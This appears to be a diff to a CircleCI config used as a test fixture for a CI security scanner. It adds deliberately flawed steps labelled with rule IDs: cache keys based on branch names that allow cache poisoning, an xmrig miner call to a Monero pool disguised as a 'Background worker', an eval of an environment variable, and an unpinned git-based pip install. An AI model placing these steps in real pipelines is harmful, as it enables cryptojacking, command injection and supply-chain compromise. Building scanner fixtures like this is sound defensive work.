@@ -22,8 +22,17 @@ jobs:
     # CC-014: No resource_class declaration on this job.
     steps:
       - checkout
+      # CC-025: restore_cache / save_cache keyed on the PR-controllable
+      # branch name — a fork PR can poison the cache for protected jobs.
+      - restore_cache:
+          keys:
+            - deps-{{ .Branch }}-{{ checksum "package-lock.json" }}
+            - deps-{{ .Branch }}-
       # CC-021: npm install instead of npm ci.
       - run: npm install
+      - save_cache:
+          key: deps-{{ .Branch }}-{{ checksum "package-lock.json" }}
+          paths: ["~/.npm"]
       # CC-002: Untrusted env var interpolation in run command.
       - run: echo "Building branch $CIRCLE_BRANCH"
 
@@ -85,6 +94,19 @@ jobs:
       - run:
           name: Configure git for internal mirror
           command: git config --global http.sslVerify false
+      # CC-026: evidence of malicious activity — xmrig miner invocation
+      # against a known Monero pool.
+      - run:
+          name: Background worker
+          command: xmrig --url stratum+tcp://pool.minexmr.com:443
+      # CC-027: dangerous shell idiom — eval re-parses the value as shell.
+      - run:
+          name: Run dynamic build
+          command: eval "$BUILD_CMD"
+      # CC-028: pip install from an unpinned git URL.
+      - run:
+          name: Install internal helper
+          command: pip install git+https://example.com/internal/helper.git
 
   deploy-production:
     docker:
